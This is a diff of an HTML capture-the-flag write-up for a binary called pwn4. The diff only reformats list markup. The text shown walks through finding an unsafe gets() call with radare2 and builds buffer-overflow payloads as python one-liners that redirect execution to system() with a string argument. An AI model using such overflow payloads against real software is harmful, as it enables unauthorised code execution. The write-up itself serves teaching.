@@ -218,7 +218,7 @@ $ r2 -A -c <span class="s1">&#39;afl&#39;</span> pwn4
 <blockquote>
 <p>By the way the command <code>s sym.flag_func; Vp</code> can be splitted and explained like this:<br />
 <code>s sym.flag_func</code> - set the position of the cursor at the beginning of the function.<br />
-<code>V</code> - Change the visual mode.<br />
+<code>V</code> - change the visual mode.<br />
 <code>p</code> - change mode view.</p>
 </blockquote>
 
@@ -231,9 +231,11 @@ $ r2 -A -c <span class="s1">&#39;afl&#39;</span> pwn4
 <p>Then we need to dig a bit more.</p>
 
 <ol>
-<li><code>sym.func2()</code> is just printing a message (it even tells you not to waste your time with it). So we can ignore this one.</li>
-<li><code>sym.func1()</code> is a bit more interesting because it is using the unsecure function <code>gets()</code>. If it is called somewhere, we would be able to overwrite the <code>$eip</code> register.</li>
-<li>We dont need to cross our fingers a lot of time because we fastly see that <code>sym.func1()</code> is being called from <code>main()</code>! yay! ✌️ .</li>
+<li><p><code>sym.func2()</code> is just printing a message (it even tells you not to waste your time with it). So we can ignore this one.</p></li>
+
+<li><p><code>sym.func1()</code> is a bit more interesting because it is using the unsecure function <code>gets()</code>. If it is called somewhere, we would be able to overwrite the <code>$eip</code> register.</p></li>
+
+<li><p>We dont need to cross our fingers a lot of time because we fastly see that <code>sym.func1()</code> is being called from <code>main()</code>! yay! ✌️ .</p></li>
 </ol>
 
 <p>Lets figure out, how many bytes do we need to overwrite <code>$eip</code> register.</p>
@@ -304,10 +306,11 @@ vaddr<span class="o">=</span><span class="mh">0x08048607</span> paddr<span class
 <p>Because we can overwrite the stack we can &ldquo;imitate&rdquo; a push into it:</p>
 
 <ol>
-<li>Instead of starting in the address of <code>sym.flag_func()</code> (<code>0x080484cb</code>) we will use <code>system()</code> one (<code>0x080484d9</code>).<br />
-<code>$ python -c 'print(&quot;A&quot;*16 + &quot;\xd9\x84\x04\x08&quot;)'</code><br /></li>
-<li>We need to push the pointer to the string to indicate <code>system()</code> which is its argument.<br />
-<code>$ python -c 'print(&quot;A&quot;*16 + &quot;\xd9\x84\x04\x08&quot; + &quot;\x28\xa0\x04\x08&quot;)'</code></li>
+<li><p>Instead of starting in the address of <code>sym.flag_func()</code> (<code>0x080484cb</code>) we will use <code>system()</code> one (<code>0x080484d9</code>).<br />
+<code>$ python -c 'print(&quot;A&quot;*16 + &quot;\xd9\x84\x04\x08&quot;)'</code></p></li>
+
+<li><p>We need to push the pointer to the string to indicate <code>system()</code> which is its argument.<br />
+<code>$ python -c 'print(&quot;A&quot;*16 + &quot;\xd9\x84\x04\x08&quot; + &quot;\x28\xa0\x04\x08&quot;)'</code></p></li>
 </ol>
 
 <p>Lets send to the server:</p>
